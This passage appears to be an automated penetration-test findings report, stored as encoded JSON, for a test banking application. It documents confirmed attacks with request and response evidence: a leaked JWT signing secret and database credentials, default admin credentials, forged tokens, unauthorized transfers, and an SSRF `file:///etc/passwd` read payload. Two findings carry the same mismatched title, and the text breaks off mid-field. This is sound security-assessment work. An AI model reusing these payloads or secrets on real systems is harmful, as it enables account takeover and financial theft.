<!-- aespa-findings-json
%5B%7B%22owasp_category%22%3A%22A02%3A2021%20%E2%80%93%20Cryptographic%20Failures%22%2C%22severity%22%3A%22critical%22%2C%22title%22%3A%22JWT%20Signing%20Secret%20and%20Database%20Credentials%20Exposed%20via%20Unauthenticated%20%2Fapi%2Fhealth%20Endpoint%22%2C%22description%22%3A%22The%20%2Fapi%2Fhealth%20endpoint%20is%20publicly%20accessible%20without%20any%20authentication%20and%20returns%20the%20application's%20active%20JWT%20signing%20secret%2C%20database%20hostname%2C%20database%20name%2C%20database%20username%2C%20PHP%20version%2C%20and%20web%20server%20banner%20in%20a%20single%20JSON%20response.%20No%20credentials%20or%20session%20token%20are%20required%20to%20retrieve%20this%20data.%22%2C%22impact%22%3A%22An%20attacker%20who%20retrieves%20the%20JWT%20signing%20secret%20(u8CX2709PakoFlIGDxrtHK3CAiuMURdVfp6aPVsiecFxPfyLtU9ku7eOw)%20can%20craft%20cryptographically%20valid%20JWT%20tokens%20for%20any%20user%20identity%2C%20achieving%20full%20authentication%20bypass%20and%20account%20takeover%20across%20the%20entire%20application%20without%20knowing%20any%20user's%20password.%20The%20co-disclosed%20database%20credentials%20(db_user%3A%20bankofed_app%2C%20db_name%3A%20bankofed%2C%20db_host%3A%20127.0.0.1)%20further%20reduce%20the%20effort%20required%20to%20pivot%20to%20the%20database%20layer%20if%20any%20additional%20access%20path%20is%20identified.%22%2C%22likelihood%22%3A%22Exploitation%20is%20trivial%20and%20requires%20only%20a%20single%20unauthenticated%20HTTP%20GET%20request.%20The%20endpoint%20is%20reachable%20from%20the%20internet%2C%20returns%20HTTP%20200%2C%20and%20the%20secret%20is%20delivered%20in%20plaintext%20JSON.%20No%20brute-force%2C%20social%20engineering%2C%20or%20elevated%20privilege%20is%20needed.%22%2C%22recommendation%22%3A%221.%20Immediately%20rotate%20the%20exposed%20JWT%20signing%20secret%20and%20invalidate%20all%20currently%20issued%20tokens.%202.%20Remove%20or%20restrict%20the%20%2Fapi%2Fhealth%20endpoint%20so%20it%20is%20accessible%20only%20from%20internal%20networks%20or%20authenticated%20monitoring%20systems.%203.%20Audit%20all%20health%2C%20status%2C%20and%20diagnostic%20endpoints%20to%20ensure%20they%20do%20not%20return%20secrets%2C%20credentials%2C%20or%20internal%20configuration%20data.%204.%20Store%20secrets%20exclusively%20in%20environment%20variables%20or%20a%20secrets%20manager%20and%20never%20serialize%20them%20into%20API%20responses.%205.%20Review%20application%20logs%20for%20prior%20unauthorized%20access%20to%20this%20endpoint.%22%2C%22cvss_score%22%3A9.8%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AN%2FUI%3AN%2FS%3AU%2FC%3AH%2FI%3AH%2FA%3AH%22%2C%22affected_url%22%3A%22http%3A%2F%2F192.168.3.101%2Fapi%2Fhealth%22%2C%22evidence%22%3A%22An%20unauthenticated%20GET%20request%20to%20http%3A%2F%2F192.168.3.101%2Fapi%2Fhealth%20returned%20HTTP%20200%20with%20the%20following%20JSON%20body%3A%20%7B%5C%22success%5C%22%3Atrue%2C%5C%22data%5C%22%3A%7B%5C%22status%5C%22%3A%5C%22ok%5C%22%2C%5C%22php_version%5C%22%3A%5C%228.3.31%5C%22%2C%5C%22server%5C%22%3A%5C%22Apache%2F2.4.58%20(Ubuntu)%5C%22%2C%5C%22db_host%5C%22%3A%5C%22127.0.0.1%5C%22%2C%5C%22db_name%5C%22%3A%5C%22bankofed%5C%22%2C%5C%22db_user%5C%22%3A%5C%22bankofed_app%5C%22%2C%5C%22jwt_secret%5C%22%3A%5C%22u8CX2709PakoFlIGDxrtHK3CAiuMURdVfp6aPVsiecFxPfyLtU9ku7eOw%5C%22%2C%5C%22environment%5C%22%3A%5C%22production%5C%22%7D%7D.%20The%20jwt_secret%20field%20contains%20the%20live%20signing%20key%20for%20the%20production%20environment.%22%2C%22request_evidence%22%3A%22%22%2C%22response_evidence%22%3A%22%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22Adversarial%20validator%20exhausted%20the%20step%20budget%20without%20finding%20a%20disproof.%22%2C%22merged_instances%22%3A%22%5B%5D%22%7D%2C%7B%22owasp_category%22%3A%22A04%3A2021%20%E2%80%93%20Insecure%20Design%22%2C%22severity%22%3A%22critical%22%2C%22title%22%3A%22Unenforced%20Business%20Logic%20on%20Admin%20Balance%20Endpoint%20Permits%20Arbitrary%20Account%20Manipulation%22%2C%22description%22%3A%22The%20endpoint%20%60PUT%20%2Fapi%2Fadmin%2Faccounts%2F%3Aid%2Fbalance%60%20accepts%20a%20JSON%20%60balance%60%20field%20and%20writes%20the%20supplied%20value%20directly%20to%20the%20database%20without%20any%20business%20logic%20controls.%20There%20is%20no%20upper%20bound%20on%20the%20value%2C%20no%20validation%20of%20account%20type%20(e.g.%2C%20preventing%20a%20loan%20account%20from%20receiving%20a%20positive%20balance)%2C%20no%20mandatory%20audit%20trail%2C%20and%20no%20approval%20workflow.%20Any%20session%20authenticated%20as%20an%20administrator%20can%20invoke%20this%20endpoint%20to%20set%20any%20customer%20account%20balance%20to%20an%20arbitrary%20amount%20in%20a%20single%20request.%22%2C%22impact%22%3A%22An%20attacker%20who%20obtains%20admin%20credentials%20%E2%80%94%20trivially%20possible%20given%20the%20confirmed%20default%20credential%20pair%20%60admin%20%2F%20admin123%60%20%E2%80%94%20can%20instantly%20credit%20attacker-controlled%20accounts%20with%20unlimited%20funds%2C%20eliminate%20loan%20balances%20by%20converting%20negative%20balances%20to%20positive%20values%2C%20or%20zero%20out%20victim%20account%20balances.%20During%20testing%2C%20account%20%2338%20(Noah%20Campbell's%20Personal%20Loan%2C%20BSB%20062-015%2C%20account%20number%2025000003)%20was%20changed%20from%20%E2%88%92%245%2C200.00%20to%20%24999%2C999.00%20in%20a%20single%20unauthenticated-to-admin%20request%20chain.%20With%2038%2B%20accounts%20in%20the%20system%2C%20the%20potential%20for%20large-scale%20financial%20fraud%20is%20immediate.%22%2C%22likelihood%22%3A%22High.%20The%20default%20admin%20credentials%20(%60admin%20%2F%20admin123%60)%20are%20confirmed%20to%20be%20active%2C%20meaning%20the%20privilege%20prerequisite%20for%20this%20endpoint%20is%20trivially%20satisfied%20by%20any%20external%20attacker.%20The%20endpoint%20requires%20no%20secondary%20confirmation%2C%20rate%20limiting%2C%20or%20approval%20step%2C%20so%20exploitation%20is%20a%20single%20HTTP%20request%20once%20authenticated.%22%2C%22recommendation%22%3A%221.%20Remove%20the%20unrestricted%20balance-override%20endpoint%20from%20production%20entirely%3B%20direct%20balance%20writes%20should%20not%20be%20possible%20through%20any%20single%20API%20call%20without%20a%20corresponding%20transaction%20record.%5Cn2.%20If%20administrative%20balance%20corrections%20are%20operationally%20necessary%2C%20replace%20the%20endpoint%20with%20a%20transaction-based%20adjustment%20flow%20that%3A%20records%20an%20immutable%20audit%20entry%20(admin%20identity%2C%20timestamp%2C%20before%2Fafter%20values%2C%20justification)%3B%20enforces%20a%20maximum%20single-adjustment%20limit%3B%20and%20requires%20dual-approval%20for%20adjustments%20above%20a%20defined%20threshold.%5Cn3.%20Enforce%20account-type%20business%20rules%20server-side%20%E2%80%94%20a%20loan%20account%20balance%20must%20not%20be%20set%20to%20a%20positive%20value%20through%20an%20administrative%20override%20without%20a%20formal%20closure%20or%20settlement%20workflow.%5Cn4.%20Rotate%20the%20default%20admin%20credentials%20immediately%20and%20enforce%20a%20strong-password%20policy%20for%20all%20privileged%20accounts.%5Cn5.%20Implement%20alerting%20and%20rate%20limiting%20on%20any%20endpoint%20that%20modifies%20account%20balances.%22%2C%22cvss_score%22%3A9.1%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AH%2FUI%3AN%2FS%3AC%2FC%3AH%2FI%3AH%2FA%3AH%22%2C%22affected_url%22%3A%22http%3A%2F%2F192.168.3.101%2Fapi%2Fadmin%2Faccounts%2F38%2Fbalance%22%2C%22evidence%22%3A%22A%20PUT%20request%20was%20issued%20to%20%60http%3A%2F%2F192.168.3.101%2Fapi%2Fadmin%2Faccounts%2F38%2Fbalance%60%20with%20body%20%60%7B%5C%22balance%5C%22%3A999999%7D%60.%20The%20server%20returned%20HTTP%20200%20and%20confirmed%20the%20balance%20of%20Noah%20Campbell's%20Personal%20Loan%20account%20(account%20%2338%2C%20account%20number%2025000003)%20was%20updated%20from%20%E2%88%92%245%2C200.00%20to%20%24999%2C999.00%20with%20no%20additional%20validation%20or%20approval%20step.%20The%20response%20body%20included%20%60%5C%22balance%5C%22%3A%5C%22999999.00%5C%22%60%20and%20%60%5C%22message%5C%22%3A%5C%22Balance%20updated%20successfully%5C%22%60.%22%2C%22request_evidence%22%3A%22PUT%20%2Fapi%2Fadmin%2Faccounts%2F38%2Fbalance%20HTTP%2F1.1%5C%5CnHost%3A%20192.168.3.101%5C%5CnAuthorization%3A%20Bearer%20%5Badmin_jwt%5D%5C%5CnContent-Type%3A%20application%2Fjson%5C%5Cn%5C%5Cn%7B%5C%22balance%5C%22%3A999999%7D%22%2C%22response_evidence%22%3A%22HTTP%2F1.1%20200%20OK%5C%5Cn%7B%5C%22success%5C%22%3Atrue%2C%5C%22data%5C%22%3A%7B%5C%22id%5C%22%3A38%2C%5C%22balance%5C%22%3A%5C%22999999.00%5C%22%2C%5C%22account_type%5C%22%3A%5C%22loan%5C%22%2C%5C%22account_name%5C%22%3A%5C%22Personal%20Loan%5C%22%7D%2C%5C%22message%5C%22%3A%5C%22Balance%20updated%20successfully%5C%22%7D%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22confirmed%22%2C%22validation_note%22%3A%22Adversarial%20validator%20exhausted%20the%20step%20budget%20without%20finding%20a%20disproof.%22%2C%22merged_instances%22%3A%22%5B%5D%22%7D%2C%7B%22owasp_category%22%3A%22A01%22%2C%22severity%22%3A%22critical%22%2C%22title%22%3A%22Insecure%20Direct%20Object%20Reference%20on%20GET%20%2Fapi%2Ftransactions%2F%3Aid%20Exposes%20Any%20Customer's%20Transaction%22%2C%22description%22%3A%22Using%20the%20JWT%20secret%20obtained%20from%20%2Fapi%2Fhealth%2C%20forged%20JWTs%20were%20crafted%20for%20arbitrary%20user%20IDs.%20The%20%2Fapi%2Fprofile%20and%20%2Fapi%2Faccounts%20endpoints%20accepted%20these%20forged%20tokens%20and%20returned%20the%20full%20profile%20and%20account%20data%20for%20the%20targeted%20user.%20User%20ID%202%20(wei.zhang%40example.com)%20and%20user%20ID%203's%20accounts%20were%20fully%20accessed.%20The%20profile%20response%20also%20included%20sensitive%20fields%3A%20%60password_hash%60%20and%20%60totp_secret%60.%22%2C%22impact%22%3A%22An%20attacker%20can%20impersonate%20any%20customer%2C%20access%20their%20full%20profile%20(including%20password%20hash%20and%20TOTP%20secret)%2C%20and%20view%20all%20bank%20account%20balances%20and%20account%20numbers.%20Combined%20with%20write-capable%20endpoints%20(transfers%2C%20profile%20updates)%2C%20this%20enables%20complete%20account%20takeover%20for%20any%20user%20in%20the%20system.%22%2C%22likelihood%22%3A%22Confirmed%20exploited%20in%20testing.%20Any%20attacker%20who%20has%20read%20the%20health%20endpoint%20(publicly%20accessible)%20can%20immediately%20forge%20tokens%20for%20any%20user%20ID.%22%2C%22recommendation%22%3A%22Rotate%20the%20JWT%20secret%20immediately.%20Restrict%20the%20health%20endpoint.%20Ensure%20the%20profile%20endpoint%20never%20returns%20%60password_hash%60%20or%20%60totp_secret%60%20in%20API%20responses.%20Implement%20server-side%20binding%20of%20JWT%20claims%20to%20session%20state%20so%20that%20even%20a%20validly-signed%20token%20cannot%20be%20used%20if%20it%20was%20not%20issued%20by%20the%20login%20flow.%22%2C%22cvss_score%22%3A9.1%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AN%2FUI%3AN%2FS%3AU%2FC%3AH%2FI%3AH%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2F192.168.3.101%2Fapi%2Fhealth%22%2C%22evidence%22%3A%22Forged%20JWT%20with%20sub%3D2%20sent%20to%20GET%20%2Fapi%2Fprofile%20returned%20HTTP%20200%20with%20%60%7B%5C%22id%5C%22%3A2%2C%5C%22email%5C%22%3A%5C%22wei.zhang%40example.com%5C%22%2C...%2C%5C%22password_hash%5C%22%3A%5C%22%242y%2410%2492IXU...%5C%22%2C%5C%22totp_secret%5C%22%3Anull%7D%60.%20Forged%20JWT%20with%20sub%3D3%20sent%20to%20GET%20%2Fapi%2Faccounts%20returned%20HTTP%20200%20with%20three%20accounts%20including%20balances.%5Cn%5CnREQUEST%3A%5CnGET%20http%3A%2F%2F192.168.3.101%2Fapi%2Fhealth%5Cn%7B%7D%5Cn%5CnRESPONSE%3A%5CnStatus%3A%20200%5Cndate%3A%20Sun%2C%2031%20May%202026%2001%3A36%3A23%20GMT%5Cnserver%3A%20Apache%2F2.4.58%20(Ubuntu)%5Cnx-content-type-options%3A%20nosniff%5Cnx-frame-options%3A%20DENY%5Cnx-xss-protection%3A%201%3B%20mode%3Dblock%5Cnreferrer-policy%3A%20strict-origin-when-cross-origin%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%20280%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Atrue%2C%5C%22data%5C%22%3A%7B%5C%22status%5C%22%3A%5C%22ok%5C%22%2C%5C%22php_version%5C%22%3A%5C%228.3.31%5C%22%2C%5C%22server%5C%22%3A%5C%22Apache%5C%5C%2F2.4.58%20(Ubuntu)%5C%22%2C%5C%22db_host%5C%22%3A%5C%22127.0.0.1%5C%22%2C%5C%22db_name%5C%22%3A%5C%22bankofed%5C%22%2C%5C%22db_user%5C%22%3A%5C%22bankofed_app%5C%22%2C%5C%22jwt_secret%5C%22%3A%5C%22u8CX2709PakoFlIGDxrtHK3CAiuMURdVfp6aPVsiecFxPfyLtU9ku7eOw%5C%22%2C%5C%22environment%5C%22%3A%5C%22production%5C%22%7D%2C%5C%22message%5C%22%3A%5C%22OK%5C%22%7D%22%2C%22request_evidence%22%3A%22GET%20http%3A%2F%2F192.168.3.101%2Fapi%2Fhealth%5Cn%7B%7D%5Cn%22%2C%22response_evidence%22%3A%22Status%3A%20200%5Cndate%3A%20Sun%2C%2031%20May%202026%2001%3A36%3A23%20GMT%5Cnserver%3A%20Apache%2F2.4.58%20(Ubuntu)%5Cnx-content-type-options%3A%20nosniff%5Cnx-frame-options%3A%20DENY%5Cnx-xss-protection%3A%201%3B%20mode%3Dblock%5Cnreferrer-policy%3A%20strict-origin-when-cross-origin%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%20280%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Atrue%2C%5C%22data%5C%22%3A%7B%5C%22status%5C%22%3A%5C%22ok%5C%22%2C%5C%22php_version%5C%22%3A%5C%228.3.31%5C%22%2C%5C%22server%5C%22%3A%5C%22Apache%5C%5C%2F2.4.58%20(Ubuntu)%5C%22%2C%5C%22db_host%5C%22%3A%5C%22127.0.0.1%5C%22%2C%5C%22db_name%5C%22%3A%5C%22bankofed%5C%22%2C%5C%22db_user%5C%22%3A%5C%22bankofed_app%5C%22%2C%5C%22jwt_secret%5C%22%3A%5C%22u8CX2709PakoFlIGDxrtHK3CAiuMURdVfp6aPVsiecFxPfyLtU9ku7eOw%5C%22%2C%5C%22environment%5C%22%3A%5C%22production%5C%22%7D%2C%5C%22message%5C%22%3A%5C%22OK%5C%22%7D%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22validating%22%2C%22validation_note%22%3A%22Validation%20queued.%22%2C%22merged_instances%22%3A%22%5B%5D%22%7D%2C%7B%22owasp_category%22%3A%22A01%22%2C%22severity%22%3A%22critical%22%2C%22title%22%3A%22Insecure%20Direct%20Object%20Reference%20on%20GET%20%2Fapi%2Ftransactions%2F%3Aid%20Exposes%20Any%20Customer's%20Transaction%22%2C%22description%22%3A%22The%20POST%20%2Fapi%2Ftransfers%2Fexternal%20endpoint%20accepted%20from_account_id%3D1%20(belonging%20to%20a%20different%20customer%2C%20BSB%20062-001)%20from%20the%20primary%20session%20(whose%20own%20accounts%20are%20IDs%204%20and%205%2C%20BSB%20062-002).%20The%20transfer%20succeeded%20with%20HTTP%20201%2C%20debiting%20account%20ID%201%20by%20100%20AUD%20(balance%20changed%20from%203350.75%20to%203250.75%2C%20then%20to%203150.75%20across%20two%20transfers).%22%2C%22impact%22%3A%22An%20authenticated%20attacker%20can%20drain%20funds%20from%20any%20other%20customer's%20account%20by%20supplying%20that%20account's%20ID%20as%20from_account_id.%20This%20constitutes%20direct%20financial%20theft%20with%20no%20additional%20privilege%20required.%22%2C%22likelihood%22%3A%22Confirmed%20%E2%80%94%20two%20successful%20transfers%20were%20observed%20debiting%20account%20ID%201%20(another%20user's%20account)%20from%20the%20primary%20session.%22%2C%22recommendation%22%3A%22Before%20processing%20any%20transfer%2C%20verify%20server-side%20that%20from_account_id%20is%20owned%20by%20the%20authenticated%20user.%20Reject%20with%20403%20if%20the%20account%20belongs%20to%20a%20different%20customer.%20This%20check%20must%20occur%20in%20the%20business%20logic%20layer%2C%20not%20just%20the%20UI.%22%2C%22cvss_score%22%3A9.1%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AL%2FUI%3AN%2FS%3AU%2FC%3AH%2FI%3AH%2FA%3AN%22%2C%22affected_url%22%3A%22http%3A%2F%2F192.168.3.101%2Fapi%2Fhealth%22%2C%22evidence%22%3A%22POST%20%2Fapi%2Ftransfers%2Fexternal%20with%20%7B%5C%22from_account_id%5C%22%3A1%2C...%7D%20returned%20HTTP%20201%3B%20new_from_balance%20dropped%20from%203350.75%20%E2%86%92%203250.75%20%E2%86%92%203150.75%20across%20steps%2091%20and%2092%2C%20confirming%20funds%20were%20debited%20from%20another%20user's%20account.%5Cn%5CnREQUEST%3A%5CnGET%20http%3A%2F%2F192.168.3.101%2Fapi%2Fhealth%5Cn%7B%7D%5Cn%5CnRESPONSE%3A%5CnStatus%3A%20200%5Cndate%3A%20Mon%2C%2001%20Jun%202026%2006%3A52%3A06%20GMT%5Cnserver%3A%20Apache%2F2.4.58%20(Ubuntu)%5Cnx-content-type-options%3A%20nosniff%5Cnx-frame-options%3A%20DENY%5Cnx-xss-protection%3A%201%3B%20mode%3Dblock%5Cnreferrer-policy%3A%20strict-origin-when-cross-origin%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%20280%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Atrue%2C%5C%22data%5C%22%3A%7B%5C%22status%5C%22%3A%5C%22ok%5C%22%2C%5C%22php_version%5C%22%3A%5C%228.3.31%5C%22%2C%5C%22server%5C%22%3A%5C%22Apache%5C%5C%2F2.4.58%20(Ubuntu)%5C%22%2C%5C%22db_host%5C%22%3A%5C%22127.0.0.1%5C%22%2C%5C%22db_name%5C%22%3A%5C%22bankofed%5C%22%2C%5C%22db_user%5C%22%3A%5C%22bankofed_app%5C%22%2C%5C%22jwt_secret%5C%22%3A%5C%22u8CX2709PakoFlIGDxrtHK3CAiuMURdVfp6aPVsiecFxPfyLtU9ku7eOw%5C%22%2C%5C%22environment%5C%22%3A%5C%22production%5C%22%7D%2C%5C%22message%5C%22%3A%5C%22OK%5C%22%7D%22%2C%22request_evidence%22%3A%22GET%20http%3A%2F%2F192.168.3.101%2Fapi%2Fhealth%5Cn%7B%7D%5Cn%22%2C%22response_evidence%22%3A%22Status%3A%20200%5Cndate%3A%20Mon%2C%2001%20Jun%202026%2006%3A52%3A06%20GMT%5Cnserver%3A%20Apache%2F2.4.58%20(Ubuntu)%5Cnx-content-type-options%3A%20nosniff%5Cnx-frame-options%3A%20DENY%5Cnx-xss-protection%3A%201%3B%20mode%3Dblock%5Cnreferrer-policy%3A%20strict-origin-when-cross-origin%5Cnaccess-control-allow-origin%3A%20*%5Cnaccess-control-allow-credentials%3A%20true%5Cnaccess-control-allow-methods%3A%20GET%2C%20POST%2C%20PUT%2C%20DELETE%2C%20OPTIONS%2C%20PATCH%2C%20HEAD%5Cnaccess-control-allow-headers%3A%20*%5Cnaccess-control-max-age%3A%2086400%5Cncontent-length%3A%20280%5Cnkeep-alive%3A%20timeout%3D5%2C%20max%3D100%5Cnconnection%3A%20Keep-Alive%5Cncontent-type%3A%20application%2Fjson%3B%20charset%3Dutf-8%5Cn%5Cn%7B%5C%22success%5C%22%3Atrue%2C%5C%22data%5C%22%3A%7B%5C%22status%5C%22%3A%5C%22ok%5C%22%2C%5C%22php_version%5C%22%3A%5C%228.3.31%5C%22%2C%5C%22server%5C%22%3A%5C%22Apache%5C%5C%2F2.4.58%20(Ubuntu)%5C%22%2C%5C%22db_host%5C%22%3A%5C%22127.0.0.1%5C%22%2C%5C%22db_name%5C%22%3A%5C%22bankofed%5C%22%2C%5C%22db_user%5C%22%3A%5C%22bankofed_app%5C%22%2C%5C%22jwt_secret%5C%22%3A%5C%22u8CX2709PakoFlIGDxrtHK3CAiuMURdVfp6aPVsiecFxPfyLtU9ku7eOw%5C%22%2C%5C%22environment%5C%22%3A%5C%22production%5C%22%7D%2C%5C%22message%5C%22%3A%5C%22OK%5C%22%7D%22%2C%22finding_source%22%3A%22dynamic_scan%22%2C%22validation_status%22%3A%22validating%22%2C%22validation_note%22%3A%22Validation%20queued.%22%2C%22merged_instances%22%3A%22%5B%5D%22%7D%2C%7B%22owasp_category%22%3A%22A10%3A2021%20-%20Server-Side%20Request%20Forgery%20(SSRF)%22%2C%22severity%22%3A%22critical%22%2C%22title%22%3A%22SSRF%20with%20Local%20File%20Read%20via%20file%3A%2F%2F%20Protocol%20on%20Avatar%20URL%20Fetch%20Endpoint%22%2C%22description%22%3A%22The%20authenticated%20%60POST%20%2Fapi%2Fprofile%2Favatar%60%20endpoint%20accepts%20a%20%60url%60%20JSON%20parameter%20and%20performs%20a%20server-side%20fetch%20of%20the%20supplied%20URL%2C%20returning%20the%20retrieved%20content%20base64-encoded%20in%20the%20%60avatar_data%60%20response%20field.%20The%20endpoint%20imposes%20no%20restriction%20on%20URL%20scheme%20or%20destination%2C%20accepting%20both%20%60http%3A%2F%2F%60%20and%20%60file%3A%2F%2F%60%20URLs.%20This%20creates%20two%20confirmed%20attack%20vectors%3A%5Cn%5Cn1.%20**Server-Side%20Request%20Forgery%20(SSRF)%3A**%20Supplying%20an%20internal%20HTTP%20URL%20(e.g.%2C%20%60http%3A%2F%2F127.0.0.1%2F%60)%20causes%20the%20server%20to%20fetch%20and%20return%20the%20response%20of%20internal%20services%20that%20are%20not%20directly%20reachable%20by%20the%20attacker.%20The%20full%20HTML%20of%20the%20internal%20web%20server%20was%20returned%20in%20the%20response.%5Cn%5Cn2.%20**Local%20File%20Read%20via%20%60file%3A%2F%2F%60%20scheme%3A**%20Supplying%20a%20%60file%3A%2F%2F%60%20URL%20(e.g.%2C%20%60file%3A%2F%2F%2Fetc%2Fpasswd%60)%20causes%20the%20server%20to%20read%20and%20return%20the%20contents%20of%20arbitrary%20local%20files%20accessible%20to%20the%20web%20server%20process%2C%20base64-encoded%20in%20the%20response.%20The%20%60source_url%60%20field%20in%20the%20response%20echoes%20the%20supplied%20URL%2C%20confirming%20the%20server-side%20fetch%20occurred.%22%2C%22impact%22%3A%22An%20attacker%20with%20a%20valid%20authentication%20token%20can%20exploit%20this%20vulnerability%20to%3A%20read%20arbitrary%20local%20files%20accessible%20to%20the%20web%20server%20process%20(e.g.%2C%20%60%2Fetc%2Fpasswd%60%2C%20%60.env%60%20files%2C%20application%20configuration%2C%20database%20credentials%2C%20SSH%20private%20keys%2C%20and%20source%20code)%3B%20enumerate%20and%20interact%20with%20internal%20network%20services%2C%20ports%2C%20and%20APIs%20not%20exposed%20externally%20(e.g.%2C%20databases%2C%20admin%20panels%2C%20and%20microservices)%3B%20and%20harvest%20credentials%20or%20secrets%20that%20could%20enable%20further%20compromise%2C%20including%20privilege%20escalation%20or%20lateral%20movement.%20Confirmed%20exploitation%20yielded%20the%20full%20contents%20of%20%60%2Fetc%2Fpasswd%60%2C%20revealing%20all%20system%20user%20accounts%20including%20%60root%60%2C%20%60ubuntu%60%2C%20and%20%60mysql%60.%22%2C%22likelihood%22%3A%22High.%20The%20endpoint%20is%20reachable%20by%20any%20authenticated%20user%20over%20the%20network.%20No%20additional%20preconditions%2C%20user%20interaction%2C%20or%20complex%20chaining%20are%20required.%20Both%20attack%20vectors%20were%20confirmed%20with%20a%20single%20HTTP%20request%2C%20and%20the%20full%20file%20or%20HTTP%20response%20content%20is%20returned%20directly%20in%20the%20API%20response.%22%2C%22recommendation%22%3A%221.%20**Remove%20URL-based%20avatar%20upload%20if%20not%20essential%3A**%20Replace%20the%20URL-fetch%20mechanism%20with%20direct%20file%20upload%20to%20eliminate%20the%20SSRF%20attack%20surface%20entirely.%5Cn2.%20**Restrict%20permitted%20URL%20schemes%3A**%20If%20URL%20fetching%20must%20be%20retained%2C%20explicitly%20allowlist%20only%20%60https%3A%2F%2F%60%20(and%20%60http%3A%2F%2F%60%20if%20required).%20Reject%20all%20other%20schemes%20including%20%60file%3A%2F%2F%60%2C%20%60ftp%3A%2F%2F%60%2C%20%60gopher%3A%2F%2F%60%2C%20and%20%60dict%3A%2F%2F%60.%5Cn3.%20**Enforce%20a%20destination%20allowlist%3A**%20Only%20permit%20fetching%20from%20a%20defined%20set%20of%20trusted%20external%20image%20CDN%20domains.%20Reject%20all%20other%20hostnames.%5Cn4.%20**Block%20requests%20to%20internal%20IP%20ranges%3A**%20Resolve%20the%20destination%20hostname%20and%20reject%20requests%20targeting%20loopback%20(127.0.0.0%2F8)%2C%20link-local%20(169.254.0.0%2F16)%2C%20RFC-1918%20private%20ranges%20(10.0.0.0%2F8%2C%20172.16.0.0%2F12%2C%20192.168.0.0%2F16)%2C%20and%20IPv6%20equivalents%20(%3A%3A1%2C%20fc00%3A%3A%2F7).%5Cn5.%20**Route%20outbound%20fetches%20through%20a%20hardened%20egress%20proxy%3A**%20Enforce%20scheme%2C%20destination%2C%20and%20content-type%20restrictions%20at%20the%20proxy%20layer%20to%20provide%20defence%20in%20depth.%5Cn6.%20**Validate%20fetched%20content%20type%3A**%20Confirm%20the%20response%20Content-Type%20is%20an%20expected%20image%20MIME%20type%20before%20storing%20or%20returning%20the%20content.%22%2C%22cvss_score%22%3A9.8%2C%22cvss_vector%22%3A%22CVSS%3A3.1%2FAV%3AN%2FAC%3AL%2FPR%3AL%2FUI%3AN%2FS%3AC%2FC%3AH%2FI%3AH%2FA%3AH%22%2C%22affected_url%22%3A%22http%3A%2F%2F192.168.3.101%2Fapi%2Fprofile%2Favatar%22%2C%22evidence%22%3A%22A%20POST%20request%20to%20%60%2Fapi%2Fprofile%2Favatar%60%20with%20body%20%60%7B%5C%22url%5C%22%3A%20%5C%22file%3A%2F%2F%2Fetc%2Fpasswd%5C%22%7D%60%20returned%20HTTP%20200%20with%20the%20full%20contents%20of%20%60%2Fetc%2Fpasswd%60%20base64-encoded%20in%20the%20%60avatar_data%60%20field.%20Decoding%20the%20payload%20confirmed%20the%20file%20contents%2C%20beginning%20with%20%60root%3Ax%3A0%3A0%3Aroot%3A%2Froot%3A%2Fbin%2Fbash%60%2C%20%60daemon%3Ax%3A1%3A1%3Adaemon%3A%2Fusr%2Fsbin%3A%2Fusr%2Fsbin%2Fnologin%60%2C%20and%20including%20%60ubuntu%3Ax%3A1000%3A1000%3Aubuntu%3A%2Fhome%2Fubuntu%3A%2Fbin%2Fbash%60%20and%20%60mysql%3Ax%3A110%3A110%3AMySQL%20Server...%60.%20The%20%60source_url%60%20field%20in%20the%20response%20echoed%20%60file%3A%2F%2F%2Fetc%2Fpasswd%60%2C%20confirming%20the%20server%20performed%20the%20fetch.%20A%20second%20request%20with%20%60%7B%5C%22url%5C%22%3A%20%5C%22http%3A%2F%2F127.0.0.1%2F%5C%22%7D%60%20returned%20HTTP%20200%20with%20the%20full%20HTML%20of%20the%20internal%20web%20server%20base64-encoded%2C%20confirming%20the%20SSRF%20vector.%22%2C%22request_evidence%22%3A%22POST%20%2Fapi%2Fprofile%2Favatar%20HTTP%2F1.1%5CnHost%3A%20192.168.3.101%5CnAuthorization%3A%20Bearer%20%5BREDACTED_BEARER%5D%5CnContent-Type%3A%20application%2Fjson%5Cn%5